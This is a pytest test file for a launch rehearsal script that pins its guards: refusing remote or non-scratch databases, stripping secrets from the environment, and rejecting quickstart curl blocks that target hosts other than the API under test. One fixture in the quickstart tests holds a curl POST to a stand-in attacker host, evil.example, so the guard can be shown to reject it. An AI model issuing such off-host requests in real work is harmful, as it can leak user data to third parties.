"""Unit tests for scripts/launch_rehearsal.py (Sprint 19, LR-1).

The rehearsal itself needs local Postgres, the MCP virtualenv, node and pip and
is run by hand (or by the engine). These tests pin its safety guards (never a
database off this machine, never a non-scratch database, never a URL off the
API under test) and the parsing it relies on.
"""
import importlib.util
import json
from pathlib import Path

import pytest

_PATH = Path(__file__).resolve().parent.parent / "scripts" / "launch_rehearsal.py"
_spec = importlib.util.spec_from_file_location("launch_rehearsal", _PATH)
lr = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(lr)

BASE = "http://127.0.0.1:8123"


@pytest.fixture
def no_database(monkeypatch):
    """Fail the test if the rehearsal gets as far as touching a database."""
    def boom(*a, **k):
        raise AssertionError("touched a database")
    monkeypatch.setattr(lr.smoke, "build_database", boom)
    monkeypatch.setattr(lr, "_psql", boom)


# ── Guards ────────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("host", ["db.neon.tech", "10.0.0.5", "pinkpopcorn.example", "0.0.0.0", ""])
def test_refuses_remote_database_host(no_database, host, capsys):
    assert lr.main(["--pg-host", host]) == 2
    assert "is not this machine" in capsys.readouterr().err


@pytest.mark.parametrize("db", ["agentx", "postgres", "neondb", "smoke_agentx"])
def test_refuses_non_scratch_database(no_database, db, capsys):
    assert lr.main(["--db", db]) == 2
    assert "must start with 'agentx_smoke'" in capsys.readouterr().err


@pytest.mark.parametrize("host", ["localhost", "127.0.0.1", "::1"])
def test_allows_scratch_database_on_this_machine(host):
    assert lr.refuse_target("agentx_smoke_launch", host) is None


def test_unknown_join_rejected(no_database):
    with pytest.raises(SystemExit) as exc:
        lr.main(["--only", "mcp,carrier-pigeon"])
    assert exc.value.code == 2


def test_only_selects_joins():
    assert lr.parse_args(["--only", "mcp, ts-sdk"]).joins == ["mcp", "ts-sdk"]
    assert lr.parse_args([]).joins == list(lr.JOINS)


def test_env_is_local_and_vps_shaped(monkeypatch):
    monkeypatch.setenv("POSTGRES_HOST", "db.neon.tech")
    monkeypatch.setenv("REDIS_URL", "rediss://upstash.example:6379")
    monkeypatch.setenv("PLATFORM_BASE_URL", "https://api.agentx.social")
    monkeypatch.setenv("ANTHROPIC_API_KEY", "not-a-real-key")
    monkeypatch.setenv("FOUNDER_DIDS", "atlas=did:agentx:atlas-001")
    env = lr.launch_env("agentx_smoke_launch")
    assert env["POSTGRES_HOST"] == "localhost"
    assert env["POSTGRES_DB"] == "agentx_smoke_launch"
    assert env["REDIS_URL"] == "memory://"
    assert env["FOUNDER_HEARTBEAT_ENABLED"] == "true"
    assert env["AGENT_OF_WEEK_ENABLED"] == "true"
    assert env["FOUNDER_LLM_PROVIDER"] == ""
    for gone in ("PLATFORM_BASE_URL", "ANTHROPIC_API_KEY", "FOUNDER_DIDS"):
        assert gone not in env


# ── Scheduler rows ────────────────────────────────────────────────────────────

JOBS = ["scheduled_maintenance", "auto_release", "founder_heartbeat", "agent_of_week"]


def _row(name, status="ok", **summary):
    return [name, status, json.dumps(summary)]


def test_job_rows_all_ok():
    rows = [_row("scheduled_maintenance", errors=[]), _row("auto_release", errors=[]),
            _row("founder_heartbeat", errors={}, posted=["atlas"]),
            _row("agent_of_week", picked=None, skipped=None)]
    assert lr.job_problems(rows, JOBS) == []


def test_job_rows_problems_reported():
    rows = [_row("scheduled_maintenance", errors=["trust: boom"]),
            _row("auto_release", "failed", error="TimeoutError"),
            _row("founder_heartbeat", skipped="disabled")]
    problems = lr.job_problems(rows, JOBS)
    assert any(p.startswith("scheduled_maintenance:") for p in problems)
    assert any(p.startswith("auto_release: failed") for p in problems)
    assert "founder_heartbeat: skipped (disabled)" in problems
    assert "agent_of_week: never ran" in problems


def test_no_results_is_not_a_pass():
    assert lr.Results().ok is False


# ── The join page and skill.md ────────────────────────────────────────────────

def test_join_page_instruction_points_at_skill_md():
    assert lr.join_instruction_url(BASE) == f"{BASE}/.well-known/skill.md"


def test_join_page_instruction_moved_is_an_error(tmp_path):
    page = tmp_path / "page.tsx"
    page.write_text("export default function Join() { return null }")
    with pytest.raises(RuntimeError, match="moved"):
        lr.join_instruction_url(BASE, page)


def test_quickstart_blocks_from_served_skill_md():
    from fastapi.testclient import TestClient

    from src.main import app

    base = "http://testserver"
    doc = TestClient(app).get("/.well-known/skill.md")
    assert doc.status_code == 200
    blocks = lr.quickstart_blocks(doc.text, base)
    assert "YourAgent" in blocks["onboard"]
    assert "<your-token>" in blocks["post"]
    assert "limit=10" in blocks["feed"]


def _doc(*blocks):
    return "\n".join(f"```bash\n{b}\n```" for b in blocks)


def test_quickstart_blocks_refuse_another_host():
    doc = _doc(f"curl -s -X POST {BASE}/onboard \\\n -d '{{}}'",
               "curl -s -X POST https://evil.example/posts \\\n -d '{}'",
               f'curl -s "{BASE}/feed/global?limit=10"')
    with pytest.raises(RuntimeError, match="evil.example"):
        lr.quickstart_blocks(doc, BASE)


def test_quickstart_blocks_missing_block():
    with pytest.raises(RuntimeError, match="feed"):
        lr.quickstart_blocks(_doc(f"curl -s -X POST {BASE}/onboard \\\n -d '{{}}'",
                                  f"curl -s -X POST {BASE}/posts \\\n -d '{{}}'"), BASE)


# ── Economy counters (Sprint 23, EM-4) ────────────────────────────────────────

def _body(**counts):
    return {name: {"count": n, "target": 5} for name, n in counts.items()}


def test_counters_moved():
    assert lr.counter_problems(_body(bounties_paid=1, collectives_by_outsiders=2)) == []


def test_counters_not_moved_reported():
    problems = lr.counter_problems(_body(bounties_paid=0, collectives_by_outsiders=1))
    assert problems == ["bounties_paid: 0 (want ≥ 1)"]


@pytest.mark.parametrize("body", [
    {}, {"bounties_paid": 3}, _body(bounties_paid=True, collectives_by_outsiders=1),
    {"bounties_paid": {"count": "4"}, "collectives_by_outsiders": {"count": 1}},
])
def test_counters_missing_or_malformed_fail(body):
    assert lr.counter_problems(body)


def test_counters_body_not_an_object_fails():
    assert lr.counter_problems([1, 2]) and lr.counter_problems(None)


def test_launch_env_keeps_counters_off(monkeypatch):
    monkeypatch.setenv("ECONOMY_STATS_ENABLED", "1")
    env = lr.launch_env("agentx_smoke_launch")
    assert "ECONOMY_STATS_ENABLED" not in env
    assert lr.counters_env(env)["ECONOMY_STATS_ENABLED"] == "1"
    assert "ECONOMY_STATS_ENABLED" not in env      # counters_env does not change the launch env


class _Resp:
    def __init__(self, status):
        self.status_code = status


@pytest.mark.parametrize("status,ok", [(404, True), (200, False), (503, False)])
def test_counters_off_wants_404(monkeypatch, status, ok):
    monkeypatch.setattr(lr.httpx, "get", lambda *a, **k: _Resp(status))
    assert (lr.counters_off(BASE) is None) is ok


def test_counters_off_unreachable_fails(monkeypatch):
    def down(*a, **k):
        raise lr.httpx.ConnectError("refused")
    monkeypatch.setattr(lr.httpx, "get", down)
    assert "ConnectError" in lr.counters_off(BASE)


def test_outside_posters_fails_when_counters_on(monkeypatch):
    monkeypatch.setattr(lr, "_psql", lambda *a, **k: [["5"]])
    monkeypatch.setattr(lr.httpx, "get", lambda *a, **k: _Resp(200))
    res = lr.Results()
    lr.check_new_agents("agentx_smoke_launch", {}, res, want=5, base=BASE)
    assert res.ok is False and "want 404" in res.rows[0][2]
    monkeypatch.setattr(lr.httpx, "get", lambda *a, **k: _Resp(404))
    res = lr.Results()
    lr.check_new_agents("agentx_smoke_launch", {}, res, want=5, base=BASE)
    assert res.ok is True
